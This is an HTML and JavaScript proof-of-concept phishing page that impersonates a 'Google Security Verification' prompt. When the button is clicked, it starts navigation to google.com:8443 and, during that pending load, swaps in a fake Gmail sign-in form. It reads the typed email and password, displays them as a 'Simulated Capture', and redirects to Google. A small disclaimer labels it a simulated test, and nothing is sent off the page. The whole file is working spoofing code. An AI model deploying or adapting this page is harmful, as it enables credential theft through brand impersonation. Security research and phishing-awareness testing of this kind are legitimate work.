<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
  h2 { color: #4285f4; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
  button:hover { background: #1557b0; }
  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>Google Security Verification</h2>
  <p>Click the button below to verify your account via port 8443.</p>
  <button id="startBtn">Verify Account</button>
  <div id="status">[*] Ready...</div>
</div>

<script>
(function () {
  'use strict';

  var btn = document.getElementById('startBtn');
  var statusEl = document.getElementById('status');

  function log(msg) {
    statusEl.textContent = msg;
    console.log("[Delay Spoof] " + msg);
  }

  btn.addEventListener('click', function() {
    log("[*] Starting delay spoofing...");

    try {
      window.location.href = "https://www.google.com:8443";
    } catch (e) {
      log("[-] Redirect error: " + e.message);
    }

    setTimeout(function() {
      document.body.innerHTML = `
        <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
          <div style="font-size:32px;font-weight:bold;color:#4285f4;margin-bottom:20px;">G</div>
          <h2 style="color:#333;margin-bottom:10px;">Sign in</h2>
          <p style="color:#666;font-size:14px;margin-bottom:20px;">to continue to Gmail</p>
          <input type="email" id="spoofEmail" placeholder="Email or phone" style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;font-size:14px;" />
          <input type="password" id="spoofPass" placeholder="Password" style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;font-size:14px;" />
          <button id="spoofLogin" style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:bold;cursor:pointer;">Next</button>
          <div style="margin-top:15px;font-size:11px;color:#f00;">Simulated phishing test UI. Do not enter real credentials.</div>
        </div>
      `;

      document.getElementById('spoofLogin').addEventListener('click', function() {
        var email = document.getElementById('spoofEmail').value;
        var password = document.getElementById('spoofPass').value;

        document.body.innerHTML = `
          <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:monospace;">
            <h2 style="color:#f00;">Simulated Capture</h2>
            <p><strong>Email:</strong> ${email}</p>
            <p><strong>Password:</strong> ${password}</p>
            <p style="color:#666;font-size:12px;margin-top:20px;">Redirecting...</p>
          </div>
        `;

        setTimeout(function() {
          window.location.href = 'https://www.google.com';
        }, 2000);
      });

      log("[+] Spoof UI displayed while navigation is pending.");
    }, 1000);
  }, { once: true });
})();
</script>

</body>
</html>
